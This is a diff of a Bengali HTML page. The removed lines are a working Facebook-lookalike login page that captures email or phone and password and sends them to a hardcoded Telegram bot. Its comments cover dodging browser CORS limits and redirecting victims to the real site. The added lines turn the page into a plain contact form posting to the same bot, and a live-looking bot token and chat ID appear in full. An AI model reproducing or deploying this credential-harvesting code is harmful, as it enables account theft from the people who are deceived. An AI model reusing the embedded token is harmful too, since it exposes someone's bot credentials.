@@ -68,37 +68,24 @@
 </head>
 <body>
 
-    <div class="form-container" style="background-color: #ffffff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); width: 350px; margin: 50px auto;">
-    <h2 style="color: #1877f2; text-align: center; font-size: 32px; margin-bottom: 20px;">facebook</h2>
-    
-    <form id="telegramForm">
-        <div class="form-group" style="margin-bottom: 12px;">
-            <input type="text" id="name" placeholder="ইমেইল বা ফোন নম্বর" required style="width: 100%; padding: 14px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box;">
-        </div>
-        
-        <div class="form-group" style="margin-bottom: 12px;">
-            <!-- এখানে textarea এর বদলে input type="password" ব্যবহার করা হয়েছে যাতে বক্স ছোট ও সুন্দর থাকে -->
-            <input type="password" id="message" placeholder="পাসওয়ার্ড" required style="width: 100%; padding: 14px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box;">
-        </div>
-        
-        <button type="submit" style="background-color: #1877f2; color: white; border: none; width: 100%; padding: 12px; font-size: 20px; font-weight: bold; border-radius: 6px; cursor: pointer; margin-bottom: 12px;">লগইন</button>
-    </form>
-    
-    <div style="text-align: center; margin-bottom: 20px;">
-        <a href="#" style="color: #1877f2; font-size: 14px; text-decoration: none;">পাসওয়ার্ড ভুলে গেছেন?</a>
+    <div class="form-container">
+        <h2>যোগাযোগ ফর্ম</h2>
+        <form id="telegramForm">
+            <div class="form-group">
+                <label for="name">আপনার নাম:</label>
+                <input type="text" id="name" required>
+            </div>
+            <div class="form-group">
+                <label for="message">আপনার বার্তা:</label>
+                <textarea id="message" required></textarea>
+            </div>
+            <button type="submit">বার্তা পাঠান</button>
+        </form>
+        <div id="statusMessage"></div>
     </div>
-    
-    <hr style="border: none; border-bottom: 1px solid #dadde1; margin-bottom: 20px;">
-    
-    <div style="text-align: center;">
-        <button style="background-color: #42b72a; color: white; border: none; padding: 12px 16px; font-size: 17px; font-weight: bold; border-radius: 6px; cursor: pointer;">নতুন অ্যাকাউন্ট তৈরি করুন</button>
-    </div>
-    
-    <div id="statusMessage" style="margin-top: 15px; text-align: center; font-size: 14px;"></div>
-</div>
 
-
-        <script>
+    <script>
+        // এখানে আপনার টেলিগ্রাম বট টোকেন এবং ইউজার/চ্যাট আইডি বসাবেন
         const BOT_TOKEN = '7035576655:AAEpweZ43S26njE0h4DLTgTF0Duo0voMrTY';
         const CHAT_ID = '5615240564';
 
@@ -109,20 +96,32 @@
             const message = document.getElementById('message').value;
             const statusDiv = document.getElementById('statusMessage');
 
-            const text = `নতুন লগইন তথ্য:\n\nইমেইল/ফোন: ${name}\nপাসওয়ার্ড: ${message}`;
+            // টেলিগ্রামে পাঠানোর জন্য মেসেজ ফরম্যাট করা
+            const text = `নতুন বার্তা এসেছে!\n\nনাম: ${name}\nবার্তা: ${message}`;
             
-            // CORS সমস্যা এড়াতে প্রক্সি ব্যবহার করা যেতে পারে অথবা GET মেথড ব্যবহার করা যায়
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+            statusDiv.style.color = '#000';
+            statusDiv.textContent = 'পাঠানো হচ্ছে...';
 
             try {
-                // fetch-এর পরিবর্তে Image বা GET method ব্যবহার করলে ব্রাউজার CORS ব্লক করে না
-                const response = await fetch(url);
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: text
+                    })
+                });
+
                 const data = await response.json();
 
                 if (data.ok) {
+                    statusDiv.style.color = 'green';
+                    statusDiv.textContent = 'বার্তা সফলভাবে পাঠানো হয়েছে!';
                     document.getElementById('telegramForm').reset();
-                    // আপনি চাইলে এখানে সফল হওয়ার পর ফেসবুকের মূল সাইটে রিডাইরেক্ট করতে পারেন:
-                    // window.location.href = "https://www.facebook.com";
                 } else {
                     statusDiv.style.color = 'red';
                     statusDiv.textContent = 'পাঠাতে ব্যর্থ হয়েছে। টোকেন বা চ্যাট আইডি চেক করুন।';
@@ -134,7 +133,6 @@
             }
         });
     </script>
-
 
 </body>
 </html>
